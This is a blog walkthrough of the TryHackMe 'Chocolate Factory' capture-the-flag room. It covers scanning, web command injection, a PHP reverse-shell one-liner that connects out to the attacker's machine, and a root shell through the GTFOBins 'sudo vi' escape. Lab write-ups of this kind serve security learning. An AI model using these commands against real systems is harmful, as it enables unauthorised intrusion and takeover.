---
layout: post
title: Tryhackme - Chocolate Factory
date: 2021-01-20 19:00:00 +0000
category: [Tryhackme, Easy]
tags: [thm,linux,easy,reversing,reverse-shell,cipher,gtfobins]
---

---
Chocolate Factory is a beginner level room in tryhackme which is based on the ```Charlie and the Chocolate factory``` film. The final objective is to get the user and root flag.
<br>
![cover_image](/assets/img/tryhackme/chocolatefactory/1.png)

**Author** | 0x9747 and saharshtapi and AndyInfoSec
**Description** | A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

Deploy the VM and let's go.

## <ins>Getting the key</ins>
---
Let's start enumerating with the usual nmap scan.
<br>
![nmap_scan](/assets/img/tryhackme/chocolatefactory/nmap_scan.png)
<br>
I was not able to login to the ```ftp service```. So, I tried grabbing the banner for other open ports using ```nmap banner script``` and ```netcat```. To run the ```nmap banner script``` use: 
<br>
<pre>nmap --script=banner 10.10.71.79 -p21-125 -v</pre>
<br>
I let nmap script scan run in one terminal and in the meanwhile I checked the individual ports using ```netcat``` utility. After checking some ports, I got this banner from the ```port 113```.
<br>
![banner_grab](/assets/img/tryhackme/chocolatefactory/15.png)
<br>

I noted that ```file name``` and checked other open ports. After the nmap script scan completed I searched for other information but my effort was useless.

I went for the ```http service``` and got the login page. I tried some common credentials but had no luck. 
<br>
![http_service](/assets/img/tryhackme/chocolatefactory/2.png)
<br>
I appended the ```file name``` in the url and got an ```ELF file```. I used ```strings``` to get the contents of the file.
<br>
![file_op](/assets/img/tryhackme/chocolatefactory/6.png)
<br>
<pre>strings key_rev_key</pre>
<br>
![strings_key](/assets/img/tryhackme/chocolatefactory/7.png)
<br>

This should answer the first question.

## <ins>Getting Charlie's password</ins>
---
I used ```gobuster``` to find the hidden directories in the webpage.
<br>
<pre>gobuster dir -u http://machine-ip/ -w /usr/share/dirb/wordlists/common.txt -x php,html,js,txt</pre>
<br>
![gobuster_results](/assets/img/tryhackme/chocolatefactory/3.png)
<br>
I went into ```home.php``` page and found a input box with the placeholder **Command**.
<br>
![home_php](/assets/img/tryhackme/chocolatefactory/4.png)
<br>

To check if the input returns a corresponding output, I used some basic command like ```whoami``` and ```id```. I confirmed that it returns the output. So, I grabbed a ```php reverse shell payload``` and executed it. 
<br>
<pre>php -r '$sock=fsockopen("your-vpn-ip",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'</pre>
<br>
Remember to open a netcat listener in your local machine.
<br>
![reverse_shell](/assets/img/tryhackme/chocolatefactory/5.png)
<br>
We got the reverse shell. Stabilize the shell using ```python pty```.

I found the ```validate.php``` file in the ```/var/www/html``` directory which contains the password of the user ```charlie```
<br>
![validate_php](/assets/img/tryhackme/chocolatefactory/8.png)
<br>

This shoud answer the second question.


## <ins>User flag</ins>
---
After enumerating further, I found the ssh private key in a file named ```teleport```  in the ```/home/charlie``` directory.
<br>
![private_key](/assets/img/tryhackme/chocolatefactory/9.png)
<br>
I copied the ssh private key into a file in my local machine and used it to ssh into the machine with the username ```charlie```. Remember to change the file permissions using...
<br>
<pre>chmod 600 id_rsa_file</pre>
<br>
![user_flag](/assets/img/tryhackme/chocolatefactory/10.png)
<br>
After ssh-ing into the machine we can get the ```user flag```.

## <ins>Root flag</ins>
---
I tried some common ways for ```priviledge escalation``` and finally found that ```/usr/bin/vi``` can be run as root.
<br>
![sudo_list](/assets/img/tryhackme/chocolatefactory/11.png)
<br>
I searched for ```vi``` in ```gtfobins``` and got the payload to spawn the root shell.
<br>
<pre>sudo vi -c ':!/bin/sh' /dev/null</pre>
<br>
![vi_hack](/assets/img/tryhackme/chocolatefactory/12.png)
<br>
Instead of the usual root flag, there is a python file with a message which is encrypted with ```Fernet```.

Fernet is a symmetric key encryption algorithm which makes sure that a message encrypted cannot be read without the key.
<br>
![enrypted_message](/assets/img/tryhackme/chocolatefactory/13.png)
<br>
I searched for ```Fernet decryptor``` in google and came across this [online Fernet decryptor](https://asecuritysite.com/encryption/ferdecode).

Put the message you found in the python file in the ```Token``` input box, the key in the key input box and click on the ```Determine``` button. 
<br>
![root_flag](/assets/img/tryhackme/chocolatefactory/14.png)
<br>
Bingo!!! We got the root flag.

That's it folks. Happy hacking!!!
